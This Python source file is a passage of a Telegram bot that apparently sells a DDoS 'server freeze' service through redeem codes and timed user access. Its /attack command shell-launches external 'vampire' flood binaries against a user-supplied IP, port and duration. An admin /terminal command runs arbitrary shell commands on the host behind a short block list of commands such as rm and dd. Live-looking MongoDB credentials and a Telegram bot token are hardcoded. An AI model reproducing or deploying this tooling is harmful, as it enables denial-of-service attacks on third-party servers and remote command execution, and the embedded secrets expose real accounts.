import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler, ContextTypes
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Database Configuration
MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['VAMPIRE']
users_collection = db['users']
settings_collection = db['settings']  # A new collection to store global settings
redeem_codes_collection = db['redeem_codes']
attack_logs_collection = db['user_attack_logs']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7743496050:AAHVJSxsBhWT7AaHUQK8jTz7uGJK9XclEV8'
ADMIN_USER_ID = 529691217
COOLDOWN_PERIOD = timedelta(minutes=1) 
user_last_attack_time = {} 
user_attack_history = {}
cooldown_dict = {}
active_processes = {}
current_directory = os.getcwd()

# Default values (in case not set by the admin)
DEFAULT_BYTE_SIZE = 5
DEFAULT_THREADS = 5
DEFAULT_MAX_ATTACK_TIME = 100
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')

# Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
PROTECTED_FILES = ["Vampire.py", "vampire"]
BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']

# Fetch the current user and hostname dynamically
USER_NAME = os.getlogin()  # Get the current system user
HOST_NAME = socket.gethostname()  # Get the system's hostname

# Store the current directory path
current_directory = os.path.expanduser("~")  # Default to the home directory

# Function to get dynamic user and hostname info
def get_user_and_host():
    try:
        # Try getting the username and hostname from the system
        user = os.getlogin()
        host = socket.gethostname()

        # Special handling for cloud environments (GitHub Codespaces, etc.)
        if 'CODESPACE_NAME' in os.environ:  # GitHub Codespaces environment variable
            user = os.environ['CODESPACE_NAME']
            host = 'github.codespaces'

        # Adjust for other environments like VS Code, IntelliJ, etc. as necessary
        # For example, if the bot detects a cloud-based platform like IntelliJ Cloud or AWS
        if platform.system() == 'Linux' and 'CLOUD_PLATFORM' in os.environ:
            user = os.environ.get('USER', 'clouduser')
            host = os.environ.get('CLOUD_HOSTNAME', socket.gethostname())

        return user, host
    except Exception as e:
        # Fallback in case of error
        return 'user', 'hostname'

# Function to handle terminal commands
async def execute_terminal(update: Update, context: CallbackContext):
    global current_directory
    user_id = update.effective_user.id

    # Restrict access to admin only
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ *You are not authorized to execute terminal commands!*",
            parse_mode='Markdown'
        )
        return

    # Ensure a command is provided
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ *Usage: /terminal <command>*",
            parse_mode='Markdown'
        )
        return

    # Join arguments to form the command
    command = ' '.join(context.args)

    # Check if the command starts with a blocked command
    if any(command.startswith(blocked_cmd) for blocked_cmd in BLOCKED_COMMANDS):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Command '{command}' is not allowed!*",
            parse_mode='Markdown'
        )
        return

    # Handle `cd` command separately to change the current directory
    if command.startswith('cd '):
        # Get the directory to change to
        new_directory = command[3:].strip()

        # Resolve the absolute path of the directory
        absolute_path = os.path.abspath(os.path.join(current_directory, new_directory))

        # Ensure the directory exists before changing
        if os.path.isdir(absolute_path):
            current_directory = absolute_path
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *Changed directory to:* `{current_directory}`",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ *Directory not found:* `{new_directory}`",
                parse_mode='Markdown'
            )
        return

    try:
        # Get dynamic user and host information
        user, host = get_user_and_host()

        # Create the prompt dynamically like 'username@hostname:/current/path$'
        current_dir = os.path.basename(current_directory) if current_directory != '/' else ''
        prompt = f"{user}@{host}:{current_dir}$ "

        # Run the command asynchronously
        result = await asyncio.create_subprocess_shell(
            command,
            cwd=current_directory,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Capture the output and error (if any)
        stdout, stderr = await result.communicate()

        # Decode the byte output
        output = stdout.decode().strip() or stderr.decode().strip()

        # If there is no output, inform the user
        if not output:
            output = "No output or error from the command."

        # Limit the output to 4000 characters to avoid Telegram message size limits
        if len(output) > 4000:
            output = output[:4000] + "\n⚠️ Output truncated due to length."

        # Send the output back to the user, including the prompt
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"💻 *Command Output:*\n{prompt}\n```{output}```",
            parse_mode='Markdown'
        )

    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Error executing command:*\n```{str(e)}```",
            parse_mode='Markdown'
        )

# Add to handle uploads when replying to a file
async def upload(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    # Only allow admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to upload files!*",
            parse_mode='Markdown'
        )
        return

    # Ensure the message is a reply to a file
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please reply to a file message with /upload to process it.*",
            parse_mode='Markdown'
        )
        return

    # Process the replied-to file
    document = update.message.reply_to_message.document
    file_name = document.file_name
    file_path = os.path.join(os.getcwd(), file_name)

    # Download the file
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ *File '{file_name}' has been uploaded successfully!*",
        parse_mode='Markdown'
    )


# Function to list files in a directory
async def list_files(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to list files!*",
            parse_mode='Markdown'
        )
        return

    directory = context.args[0] if context.args else os.getcwd()

    if not os.path.isdir(directory):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Directory not found:* `{directory}`",
            parse_mode='Markdown'
        )
        return

    try:
        files = os.listdir(directory)
        if files:
            files_list = "\n".join(files)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *Files in Directory:* `{directory}`\n{files_list}",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *No files in the directory:* `{directory}`",
                parse_mode='Markdown'
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Error accessing the directory:* `{str(e)}`",
            parse_mode='Markdown'
        )


async def delete_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to delete files!*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /delete <file_name>*",
            parse_mode='Markdown'
        )
        return

    file_name = context.args[0]
    file_path = os.path.join(os.getcwd(), file_name)

    if file_name in PROTECTED_FILES:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ *File '{file_name}' is protected and cannot be deleted.*",
            parse_mode='Markdown'
        )
        return

    if os.path.exists(file_path):
        os.remove(file_path)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"✅ *File '{file_name}' has been deleted.*",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ *File '{file_name}' not found.*",
            parse_mode='Markdown'
        )
        
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        # Help text for regular users (exclude sensitive commands)
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*🔸 /start* - Start interacting with the bot.\n"
            "*🔸 /attack* - Trigger an attack operation.\n"
            "*🔸 /redeem* - Redeem a code.\n"
        )
    else:
        # Help text for admins (include sensitive commands)
        help_text = (
            "*🖥️ Available Commands for Admins:*\n\n"
            "*⚡ /start* - Start the bot.\n"
            "*🚀 /attack* - Start the attack.\n"
            "*🫧 /add [user_id]* - Add a user.\n"
            "*☠️ /remove [user_id]* - Remove a user.\n"
            "*🧵 /thread [number]* - Set number of threads.\n"
            "*🪦 /byte [size]* - Set the byte size.\n"
            "*🪩 /show* - Show current settings.\n"
            "*👥 /users* - List all allowed users.\n"
            "*🌀 /gen* - Generate a redeem code.\n"
            "*💌 /redeem* - Redeem a code.\n"
            "*♻️ /cleanup* - Clean up stored data.\n"
            "*🪦 /argument [type]* - Set the (3, 4, or 5).\n"
            "*☢️ /delete_code* - Delete a redeem code.\n"
            "*🧾 /list_codes* - List all redeem codes.\n"
            "*⌛ /set_time* - Set max attack time.\n"
            "*📊 /log [user_id]* - View attack history.\n"
            "*🗑️ /delete_log [user_id]* - Delete history.\n"
            "*📤 /upload* - Upload a file.\n"
            "*🗃️ /ls* - List files in the directory.\n"
            "*🔰 /delete [filename]* - Delete a file.\n"
            "*📲 /terminal [command]* - Execute.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id 

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌  You are not authorized to use this bot! please connect to the owner grab your keys @Demon_Rocky*", parse_mode='Markdown')
        return

    message = (
         "*🔥 ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ÐȺƦʞᏔǝß ıllıllı 🔥*\n\n"
        "*Use 🖥️ /attack <ip> <port> <duration>*\n"
        "*💌/redeem - Redeem code*\n"
        "*☄️ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @Demon_Rocky 🚀*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)  # Updated to use timezone-aware UTC

    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    
    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the number of threads!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /thread <number of threads>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        if threads <= 0:
            raise ValueError("Number of threads must be positive.")

        # Save the number of threads to the database
        settings_collection.update_one(
            {"setting": "threads"},
            {"$set": {"value": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Number of threads set to {threads}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the byte size!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /byte <byte size>*", parse_mode='Markdown')
        return

    try:
        byte_size = int(context.args[0])
        if byte_size <= 0:
            raise ValueError("Byte size must be positive.")

        # Save the byte size to the database
        settings_collection.update_one(
            {"setting": "byte_size"},
            {"$set": {"value": byte_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Byte size set to {byte_size}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    # Only allow the admin to use this command
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view settings!*", parse_mode='Markdown')
        return

    # Retrieve settings from the database
    byte_size_setting = settings_collection.find_one({"setting": "byte_size"})
    threads_setting = settings_collection.find_one({"setting": "threads"})
    argument_type_setting = settings_collection.find_one({"setting": "argument_type"})
    max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})

    byte_size = byte_size_setting["value"] if byte_size_setting else DEFAULT_BYTE_SIZE
    threads = threads_setting["value"] if threads_setting else DEFAULT_THREADS
    argument_type = argument_type_setting["value"] if argument_type_setting else 3  # Default to 3 if not set
    max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else 60  # Default to 60 seconds if not set

    # Send settings to the admin
    settings_text = (
        f"*Current Bot Settings:*\n"
        f"🗃️ *Byte Size:* {byte_size}\n"
        f"🔢 *Threads:* {threads}\n"
        f"🔧 *Argument Type:* {argument_type}\n"
        f"⏲️ *Max Attack Time:* {max_attack_time} seconds\n"
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=settings_text, parse_mode='Markdown')

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_time = datetime.now(timezone.utc)
    users = list(users_collection.find())  # Convert cursor to list

    user_list_message = "👥 User List:\n"

    if not users:  # Check if the user collection is empty
        user_list_message += "No users found."
    else:
        for user in users:
            user_id = user['user_id']
            expiry_date = user.get('expiry_date')  # Safely get expiry_date

            if expiry_date is None:  # Check if expiry_date is None
                user_list_message += f"🔴 *User ID: {user_id} - Expiry: Not set*\n"
                continue  # Skip to the next user

            # Ensure expiry_date is timezone-aware
            if isinstance(expiry_date, datetime) and expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)

            time_remaining = expiry_date - current_time
            if time_remaining.days < 0:
                remaining_days = 0
                remaining_hours = 0
                remaining_minutes = 0
                expired = True  
            else:
                remaining_days = time_remaining.days
                remaining_hours = time_remaining.seconds // 3600
                remaining_minutes = (time_remaining.seconds // 60) % 60
                expired = False 

            expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
            if expired:
                user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
            else:
                user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user.get('expiry_date')  # Safely get expiry_date
        if expiry_date:
            if isinstance(expiry_date, datetime) and expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Function to set the argument type for attack commands
async def set_argument(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the argument!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /argument <3|4|5>*", parse_mode='Markdown')
        return

    try:
        argument_type = int(context.args[0])
        if argument_type not in [3, 4, 5]:
            raise ValueError("Argument must be 3, 4, or 5.")

        # Store the argument type in the database
        settings_collection.update_one(
            {"setting": "argument_type"},
            {"$set": {"value": argument_type}},
            upsert=True
        )

        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Argument type set to {argument_type}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def set_max_attack_time(update: Update, context: CallbackContext):
    """Command for the admin to set the maximum attack time allowed."""
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the max attack time!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set_time <max time in seconds>*", parse_mode='Markdown')
        return

    try:
        max_time = int(context.args[0])
        if max_time <= 0:
            raise ValueError("Max time must be a positive integer.")

        # Save the max attack time to the database
        settings_collection.update_one(
            {"setting": "max_attack_time"},
            {"$set": {"value": max_time}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Maximum attack time set to {max_time} seconds.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

# Function to log user attack history
async def log_attack(user_id, ip, port, duration):
    # Store attack history in MongoDB
    attack_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc)  # Store timestamp in UTC
    }
    attack_logs_collection.insert_one(attack_log)

# Modify attack function to log attack history
active_attack_user = None
active_attack_start_time = None
active_attack_duration = None

async def attack(update: Update, context: CallbackContext):
    global active_attack_user, active_attack_start_time, active_attack_duration

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the user ID
    current_time = datetime.now(timezone.utc)

    # Instant response: Attack has been initiated
    await context.bot.send_message(chat_id=chat_id, text="*⚡ Attack initiated... Please wait while we process your request!*", parse_mode='Markdown')

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! please connect to the owner grab your keys @Demon_Rocky*", parse_mode='Markdown')
        return

    # Admin ko koi restriction nahi honi chahiye
    if user_id == ADMIN_USER_ID:
        pass  # Admin can always attack, no waiting time or restrictions

    else:
        # Agar attack chal raha ho to dusra user attack nahi kar sakta
        if active_attack_user is not None:
            # Agar koi aur user ka attack chal raha ho
            elapsed_time = current_time - active_attack_start_time
            remaining_time = active_attack_duration - elapsed_time

            if remaining_time > timedelta(seconds=0):  # Agar attack chal raha hai
                remaining_minutes = remaining_time.seconds // 60
                remaining_seconds = remaining_time.seconds % 60

                # Notify the user to wait until the current attack finishes
                await context.bot.send_message(
                    chat_id=chat_id, 
                    text=f"*⚠️ An attack is currently ongoing. Please wait for {remaining_minutes} minute(s) and {remaining_seconds} second(s) before trying again.*", 
                    parse_mode='Markdown'
                )
                return
            else:
                # Agar attack complete ho gaya ho
                active_attack_user = None
                active_attack_start_time = None
                active_attack_duration = None

    # Process attack arguments
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    # Validate IP prefix
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP prefix. Only specific IP ranges are allowed.*", parse_mode='Markdown')
        return

    # Agar user ne pehle attack kiya ho to unhe wo block karna
    if user_id != ADMIN_USER_ID and user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port*", parse_mode='Markdown')
        return

    try:
        duration = int(duration)

        # Get max attack duration from the database
        max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
        max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME

        # Agar attack duration limit se zyada ho, toh error dikhaye
        if duration > max_attack_time:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.*", parse_mode='Markdown')
            return

    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be an integer representing seconds.*", parse_mode='Markdown')
        return

    # Set attack command (Vampire)
    argument_type = settings_collection.find_one({"setting": "argument_type"})
    argument_type = argument_type["value"] if argument_type else 3  # Default to 3 if not set

    # Get byte size and thread count from the database
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})

    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS

    # Set Vampire attack command
    if argument_type == 3:
        attack_command = f"./vampire3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./vampire4 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./vampire {ip} {port} {duration} {byte_size} {threads}"

    # Send attack details to the user (after instant response)
    await context.bot.send_message(chat_id=chat_id, text=(
    f"*⚡𝗗𝗮𝗿𝗸Ꮤǝ𝗕 𝗔丅丅𝗮𝗰𝗸 𝗟𝗮𝘂𝗻𝗰𝗵ə𝗱 ☠️*\n" 
    f"*🖥️ 𝗧𝗮𝗿𝗴𝗲𝘁:: {ip}:{port}*\n"
    f"*⌛ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀*\n"
    f"*🚀•---» 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! «---•🚀 *"
    ), parse_mode='Markdown')

    # Log the attack (save details to the database or log file)
    await log_attack(user_id, ip, port, duration)

    # Mark the user as the active attacker and save the start time and duration
    active_attack_user = user_id
    active_attack_start_time = current_time
    active_attack_duration = timedelta(seconds=duration)

    # Run the attack command asynchronously
    asyncio.create_task(run_attack(chat_id, attack_command, context))

    # Update the last attack time for the user
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))



async def run_attack(chat_id, attack_command, context):
    try:
        process = await asyncio.create_subprocess_shell(
            attack_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*🚀𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀*\n*𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗼𝘂𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀 @Vampirexcheats*", parse_mode='Markdown')

# Command to view the attack history of a user
async def view_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view attack logs!*", parse_mode='Markdown')
        return

    # Ensure the correct number of arguments are provided
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /log <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Retrieve attack logs for the user
    attack_logs = attack_logs_collection.find({"user_id": target_user_id})
    if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user.*", parse_mode='Markdown')
        return

    # Display the logs in a formatted way
    logs_text = "*User Attack History:*\n"
    for log in attack_logs:
        # Convert UTC timestamp to local timezone
        local_timestamp = log['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
        formatted_time = local_timestamp.strftime('%Y-%m-%d %I:%M %p')  # Format to 12-hour clock without seconds
        
        # Format each entry with labels on separate lines
        logs_text += (
            f"IP: {log['ip']}\n"
            f"Port: {log['port']}\n"
            f"Duration: {log['duration']} sec\n"
            f"Time: {formatted_time}\n\n"
        )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=logs_text, parse_mode='Markdown')

# Command to delete the attack history of a user
async def delete_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to delete attack logs!*", parse_mode='Markdown')
        return

    # Ensure the correct number of arguments are provided
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /delete_log <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Delete attack logs for the specified user
    result = attack_logs_collection.delete_many({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Deleted {result.deleted_count} attack log(s) for user {target_user_id}.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user to delete.*", parse_mode='Markdown')

# Function to generate a redeem code with a specified redemption limit and optional custom code name
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return

    # Default values
    max_uses = 1
    custom_code = None

    # Determine if the first argument is a time value or custom code
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        # First argument is time, generate a random code
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        # First argument is custom code
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code

    # Check if a time value was provided
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    # Calculate expiration time
    if time_input[-1].lower() == 'd':  # Days
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':  # Minutes
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"

    # Set max_uses if provided
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return

    # Insert the redeem code with expiration and usage limits
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],  # Track user IDs that redeem the code
        "max_uses": max_uses,
        "redeem_count": 0
    })

    # Format the message
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    
    # Send the message with the code in monospace
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

# Function to redeem a code with a limited number of uses
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness

